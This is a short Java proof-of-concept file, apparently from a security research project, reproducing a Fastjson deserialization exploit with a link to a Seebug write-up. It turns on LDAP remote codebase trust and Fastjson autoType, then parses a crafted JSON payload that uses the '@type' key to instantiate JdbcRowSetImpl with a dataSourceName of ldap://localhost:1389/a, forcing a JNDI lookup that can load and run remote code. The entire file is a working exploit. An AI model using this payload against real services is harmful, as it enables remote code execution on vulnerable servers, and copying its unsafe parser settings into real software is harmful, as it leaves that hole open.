package com.example.fastjson220523poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * https://paper.seebug.org/1192/#ver1268
 */
public class JNDI1241 {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        String payload = "{\"rand1\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/a\",\"autoCommit\":true}}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parse(payload);
    }
}
